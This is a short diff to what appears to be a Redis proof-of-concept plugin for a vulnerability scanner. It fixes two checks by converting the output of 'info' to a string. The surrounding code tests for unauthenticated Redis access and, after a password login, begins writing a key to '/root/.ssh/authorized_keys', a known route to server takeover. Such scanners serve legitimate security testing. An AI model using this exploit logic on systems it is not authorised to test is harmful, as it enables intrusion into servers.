@@ -25,7 +25,7 @@ class POC(Script):
             # ,socket_connect_timeout=data['timeout'],socket_timeout=data['timeout']
             r = redis.Redis(self.target_host, self.target_port , socket_timeout = 5)
             info = r.info()
-            if 'redis' in info:
+            if 'redis' in str(info):
                 self.flag = 1
                 self.req.append({"info": "info"})
                 self.res.append({"info":"redis unauth","key":"info","redis_info": info})
@@ -64,7 +64,7 @@ class POC(Script):
 
             pool = redis.ConnectionPool(host=self.target_host, password=password, port=self.target_port)
             r = redis.Redis(connection_pool=pool)
-            if 'redis_version' in r.info():
+            if 'redis_version' in str(r.info()):
                 key = _random_string(10)
                 path = '/root/.ssh'
                 name = 'authorized_keys'
